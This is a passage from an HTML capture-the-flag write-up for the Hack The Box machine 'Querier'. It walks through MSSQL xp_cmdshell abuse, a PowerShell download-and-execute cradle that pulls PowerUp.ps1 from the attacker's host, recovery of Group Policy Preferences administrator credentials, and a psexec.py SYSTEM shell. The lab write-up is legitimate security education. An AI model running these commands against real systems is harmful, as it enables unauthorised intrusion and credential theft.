+                [*]&nbsp;INFO(QUERIER):&nbsp;Line&nbsp;185:&nbsp;Configuration&nbsp;option&nbsp;'xp_cmdshell'&nbsp;changed&nbsp;from&nbsp;0&nbsp;to&nbsp;1.&nbsp;Run&nbsp;the&nbsp;RECONFIGURE&nbsp;statement&nbsp;to&nbsp;install.<br>
+                SQL&gt;&nbsp;RECONFIGURE<br>
+                SQL&gt;&nbsp;EXEC&nbsp;master.sys.xp_cmdshell&nbsp;whoami<br>
+                output<br>
+                -------------------------------------------------------<br>
+                querier\mssql-svc<br>
+                NULL<br>
+                SQL&gt;
+            </div>
+        </div><br>
+        <br>
+        You could get a shell manually, which might be a worthwhile exercise doing sometime, by:<br>
+        • enabling xp_cmdshell<br>
+        • downloading a shell to the target system using xp_cmdshell<br>
+        • and running said shell<br>
+        <br>
+        Instead, Alamot has a script that will do all this for you; in true script-kiddie fashion.<br>
+        All credit here - <a href="https://alamot.github.io/mssql_shell/">https://alamot.github.io/mssql_shell/</a><br>
+            <div class="codebox">
+                root@gotham:~/ctf/querier/1433ms-sql#&nbsp;wget&nbsp;https://raw.githubusercontent.com/Alamot/code-snippets/master/mssql/mssql_shell.py<br>
+                ...<br>
+                root@gotham:~/ctf/querier/1433ms-sql#&nbsp;nano&nbsp;mssql_shell.py&nbsp;<br>
+                ...<br>
+                MSSQL_SERVER="10.10.10.125"<br>
+                MSSQL_USERNAME&nbsp;=&nbsp;"querier.htb.local\mssql-svc"<br>
+                MSSQL_PASSWORD&nbsp;=&nbsp;"corporate568"<br>
+                ...<br>
+                root@gotham:~/ctf/querier/1433ms-sql#&nbsp;python&nbsp;mssql_shell.py<br>
+                Successful&nbsp;login:&nbsp;querier.htb.local\mssql-svc@10.10.10.125<br>
+                Trying&nbsp;to&nbsp;enable&nbsp;xp_cmdshell&nbsp;...<br>
+                CMD&nbsp;mssql-svc@QUERIER&nbsp;C:\Windows\system32&gt;
+            </div>
+        </div><br>
+        <br>
+        A shell! Took me long enough.<br>
+        Get the user flag.<br>
+            <div class="codebox">
+                CMD&nbsp;mssql-svc@QUERIER&nbsp;C:\Users\mssql-svc&gt;&nbsp;cd&nbsp;C:\Users\mssql-svc\Desktop<br>
+                CMD&nbsp;mssql-svc@QUERIER&nbsp;C:\Users\mssql-svc\Desktop&gt;&nbsp;type&nbsp;user.txt<br>
+                c37b4....
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) PowerUp</strong></h2><br>
+        PowerSploit's <code>PowerUp.ps1</code> is a powershell script that will run checks against a machine for common privilege escalation methods.<br>
+        I went through all of the effort transferring the script to the machine via smb only to run into issues trying to run it.<br>
+        <br>
+        Instead, the easier option with no issues is to not bother transferring the script at all and instead run it off of a host elsewhere.<br>
+        I didn't want to run the script via github, so I downloaded the script to my attacking machine and hosted it via <code>python -m SimpleHTTPServer</code>.<br>
+        <br>
+        Serve <code>PowerUp.ps1</code><br>
+            <div class="codebox">
+                root@gotham:/tmp/webserv#&nbsp;wget&nbsp;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1<br>
+                ...<br>
+                root@gotham:/tmp/webserv#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run <code>PowerUp.ps1</code><br>
+            <div class="codebox">
+                CMD&nbsp;mssql-svc@QUERIER&nbsp;C:\Windows\system32&gt;&nbsp;powershell.exe&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;"IEX&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString('http://10.10.14.181:8000/PowerUp.ps1');&nbsp;Invoke-AllChecks"<br>
+                [*]&nbsp;Running&nbsp;Invoke-AllChecks<br>
+                ...<br>
+                [*]&nbsp;Checking&nbsp;for&nbsp;cached&nbsp;Group&nbsp;Policy&nbsp;Preferences&nbsp;.xml&nbsp;files....<br>
+                Changed&nbsp;&nbsp;&nbsp;:&nbsp;{2019-01-28&nbsp;23:12:48}<br>
+                UserNames&nbsp;:&nbsp;{Administrator}<br>
+                NewName&nbsp;&nbsp;&nbsp;:&nbsp;[BLANK]<br>
+                Passwords&nbsp;:&nbsp;{MyUnclesAreMarioAndLuigi!!1!}<br>
+                File&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;C:\ProgramData\Microsoft\Group&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Inside the Group Policy Preferences files are another set of credentials:<br>
+        <code>Administrator</code><br>
+        <code>MyUnclesAreMarioAndLuigi!!1!</code><br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>9) psexec</strong></h2><br>
+        <code>PsExec</code> is a Sysinternals Windows telnet replacement “that lets you execute processes on other systems� - <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a><br>
+        <br>
+        Impacket has written their own open source version in python based on <code>RemComSvc</code>, a now deprecated C++ tool that was an open source inspiration of Sysinternal's <code>PsExec</code>.<br>
+        <br>
+        Using Impacket's psexec.py, we can get a shell as Administrator using the credentials we've just found.<br>
+        Here's a great blog (which I found the psexec.py method from) that showcases other methods - <a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">https://blog.ropnop.com/using-credentials-to-own-windows-boxes/</a><br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/querier#&nbsp;wget&nbsp;https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py<br>
+                ...<br>
+                root@gotham:~/ctf/querier#&nbsp;python&nbsp;psexec.py&nbsp;Administrator@10.10.10.125<br>
+                Impacket&nbsp;v0.9.19&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
+                <br>
+                Password:&nbsp;MyUnclesAreMarioAndLuigi!!1!<br>
+                [*]&nbsp;Requesting&nbsp;shares&nbsp;on&nbsp;10.10.10.125.....<br>
+                [*]&nbsp;Found&nbsp;writable&nbsp;share&nbsp;ADMIN$<br>
+                [*]&nbsp;Uploading&nbsp;file&nbsp;QGdkVrYh.exe<br>
+                [*]&nbsp;Opening&nbsp;SVCManager&nbsp;on&nbsp;10.10.10.125.....<br>
+                [*]&nbsp;Creating&nbsp;service&nbsp;puMG&nbsp;on&nbsp;10.10.10.125.....<br>
+                [*]&nbsp;Starting&nbsp;service&nbsp;puMG.....<br>
+                [!]&nbsp;Press&nbsp;help&nbsp;for&nbsp;extra&nbsp;shell&nbsp;commands<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;10.0.17763.292]<br>
+                (c)&nbsp;2018&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                C:\Windows\system32&gt;whoami<br>
+                nt&nbsp;authority\system<br>
+                C:\Windows\system32&gt;cd&nbsp;C:\Users\Administrator\Desktop<br>
+                C:\Users\Administrator\Desktop&gt;type&nbsp;root.txt<br>
+                b19c....
+            </div>
+        </div><br>
+        <br>
+        Root! Finally.<br>
+    </writeup>
+</section>
+
+</body>
+</html>
